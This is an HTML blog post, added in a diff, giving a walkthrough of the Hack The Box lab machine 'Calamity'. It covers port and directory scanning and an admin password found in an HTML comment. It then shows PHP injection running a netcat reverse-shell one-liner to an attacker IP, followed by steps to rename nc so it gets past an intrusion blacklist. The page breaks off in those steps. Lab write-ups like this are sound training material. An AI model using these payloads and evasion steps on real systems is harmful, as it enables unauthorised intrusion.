@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.32" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - Calamity | My homepage</title>
+    <meta name="description" content="Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root.">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - Calamity" />
+<meta property="og:description" content="Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_calamity/" />
+
+
+
+<meta property="article:published_time" content="2018-01-26T00:00:00&#43;01:00"/>
+
+<meta property="article:modified_time" content="2018-01-26T00:00:00&#43;01:00"/>
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_calamity/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Hack The Box Write-up - Calamity">
+<meta itemprop="description" content="Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root.">
+
+
+<meta itemprop="datePublished" content="2018-01-26T00:00:00&#43;01:00" />
+<meta itemprop="dateModified" content="2018-01-26T00:00:00&#43;01:00" />
+<meta itemprop="wordCount" content="1952">
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Calamity</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>10 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2018-01-26T00:00:00&#43;01:00">26 Jan, 2018</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the Hack The Box machine called Calamity. Involves basic enumeration, finding a way into a hidden admin panel of the webserver, injecting PHP code after getting past the login, evading an intrusion detection system, recovering an SSH password hidden inside audio files and finally using LXD/LXD to exploit a user administration mistake to get root.</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a></li>
+<li><a href="#from-rce-to-shell">From RCE to shell</a></li>
+<li><a href="#audio-steganography">Audio steganography</a></li>
+<li><a href="#privesc-with-lxd-lxc">Privesc with LXD/LXC</a>
+<ul>
+<li><a href="#prepare-image">Prepare image</a></li>
+<li><a href="#prepare-container">Prepare container</a></li>
+<li><a href="#run-shell">Run shell</a></li>
+</ul></li>
+<li><a href="#buffer-overflow">Buffer overflow</a></li>
+<li><a href="#links">Links</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<p><a href="https://www.hackthebox.eu/">Hack The Box</a> is a new company offering lab servers you can test penetration testing techniques on.
+It is quite educative and a lot of fun.
+They have multiple machines and all follow a similar pattern.
+You start with an IP address, have to find a way to get code execution on the machine (usually as an unpriviledged user) and have to escalate from there to root.
+This post is about one of the machines called calamity.
+It&rsquo;s a full walkthrough of all steps needed to become root.</p>
+
+<p>Below are the statistics for this machine.
+You can see lots of people finished to code execution part, which is pretty easy.
+The second part though was really though, unless you find the easy but not well known way via LXD.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/0_htb_calamity/calamity_owns.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Statistics for calamity - user and system owns</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Given the IP, we start with a basic nmap scan:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>root@kali ~ $ nmap -sV -sC -oN nmap 10.10.10.27
+Nmap scan report <span style="color: #66d9ef">for</span> 10.10.10.27
+Host is up <span style="color: #f92672">(</span>0.042s latency<span style="color: #f92672">)</span>.
+Not shown: <span style="color: #ae81ff">998</span> closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color: #f92672">(</span>Ubuntu Linux<span style="color: #f8f8f2">;</span> protocol 2.0<span style="color: #f92672">)</span>
+<span style="color: #f8f8f2">|</span> ssh-hostkey:
+<span style="color: #f8f8f2">|</span>   <span style="color: #ae81ff">2048</span> b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 <span style="color: #f92672">(</span>RSA<span style="color: #f92672">)</span>
+<span style="color: #f8f8f2">|</span>   <span style="color: #ae81ff">256</span> 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 <span style="color: #f92672">(</span>ECDSA<span style="color: #f92672">)</span>
+<span style="color: #f8f8f2">|</span>_  <span style="color: #ae81ff">256</span> a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 <span style="color: #f92672">(</span>EdDSA<span style="color: #f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.18 <span style="color: #f92672">((</span>Ubuntu<span style="color: #f92672">))</span>
+<span style="color: #f8f8f2">|</span>_http-server-header: Apache/2.4.18 <span style="color: #f92672">(</span>Ubuntu<span style="color: #f92672">)</span>
+<span style="color: #f8f8f2">|</span>_http-title: Brotherhood Software
+Service Info: OS: Linux<span style="color: #f8f8f2">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div>
+
+
+<p>Not too much to see.
+We proceed by inspecting the webserver
+In the background, run a tool like dirbuster or Gobuster to enumerate.
+The landing page is a picture with no further content.
+However, after a short while, the tools find more endpoints:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>root@kali ~ $ gobuster -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.27/ -o ./gobuster.php.log
+/uploads <span style="color: #f92672">(</span>Status: 301<span style="color: #f92672">)</span>
+/admin.php <span style="color: #f92672">(</span>Status: 200<span style="color: #f92672">)</span>
+</code></pre></div>
+
+
+<p>The uploads folder is empty and does not really help.
+However, the admin page is quite interesting.
+It prompts for a password and username.
+SQL injection might be the next thing to try, but in this case, merely looking at the HTML source is enough.
+You can find a password in the comments.
+You can also see the labels of username and password are switched, i.e., you have to put the password into the username field and vice versa.</p>
+
+<p>The comments reveal only a password but no user.
+It is not hard to guess the username though since it is &ldquo;admin&rdquo; (probably most people&rsquo;s first try).</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/0_htb_calamity/admin_login.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Login page for admin area. Password is hidden in HTLM comments. Username must be guessed.</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<h1 id="from-rce-to-shell">From RCE to shell</h1>
+
+<p>After login, you get to a page with a lot of strange text.
+At the bottom, there is a form field with a button which invites you to submit some HTML.
+If you do, you see it rendered on the page.
+The text also mentions PHP.</p>
+
+<p>If you try to submit some PHP rather than HTML, you see it get&rsquo;s evaluated too.
+This get&rsquo;s us immediate code execution.
+To test, list the current directory:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/0_htb_calamity/code_injection.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Inject PHP code into the form to execute code on the host.</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>Since we have code execution, it&rsquo;s time to get a shell.
+Pick a webshell from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> and run a system call through PHP like so: <code>&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.15.130 1234 &gt;/tmp/f') ?&gt;</code>.
+Before submitting it, don&rsquo;t forget to run netcat locally to catch the shell.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>root@kali ~ $ nc -lnvp 1234
+listening on <span style="color: #f92672">[</span>any<span style="color: #f92672">]</span> <span style="color: #ae81ff">1234</span> ...
+connect to <span style="color: #f92672">[</span>10.10.15.130<span style="color: #f92672">]</span> from <span style="color: #f92672">(</span>UNKNOWN<span style="color: #f92672">)</span> <span style="color: #f92672">[</span>10.10.10.27<span style="color: #f92672">]</span> 53200
+/bin/sh: 0: can<span style="color: #960050; background-color: #1e0010">&#39;</span>t access tty<span style="color: #f8f8f2">;</span> job control turned off
+root@kali ~ $
+</code></pre></div>
+
+
+<p>It works, but the shell is killed immediately after the connection is established.
+We must stick to the web shell for now and find out why this is happening.
+Look around in the home directory of user <code>xalvas</code>, which is full of interesting files (<code>&lt;?php system('ls -lah /home/xalvas') ?&gt;</code>).
+In particular, there is a file called INTRUSIONS, which appears to list intrusion attempts the system has identified.
+Open it with <code>&lt;?php system('cat /home/xalvas/intrusions') ?&gt;</code> and you see:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span><span style="color: #f92672">[</span>...<span style="color: #f92672">]</span>
+POSSIBLE INTRUSION BY BLACKLISTED PROCCESS nc ...PROCESS KILLED AT 2018-01-21 16:19:35.379876
+</code></pre></div>
+
+
+<p>Comparing against the date with <code>&lt;?php system('ls -lah /home/xalvas') ?&gt;</code>, which prints <code>Sun Jan 21 16:24:44 EST 2018</code>, we can see that this linewas likely produced due to our use of nc.
+Assuming intrusions are detected by comparing filename to a blacklist, all we have to do is create a version of nc with a harmles name:</p>
+
+<ol>
+<li><code>&lt;?php system('which nc') ?&gt;</code> -&gt; <code>/bin/nc</code> finds the binary</li>
+<li><code>&lt;?php system('cp /bin/nc /dev/shm/harmless') ?&gt;</code> copies it to a temp folder</li>
+<li><code>&lt;?php system('chmod +x /dev/shm/harmless') ?&gt;</code> ensures the new file is executable</li>
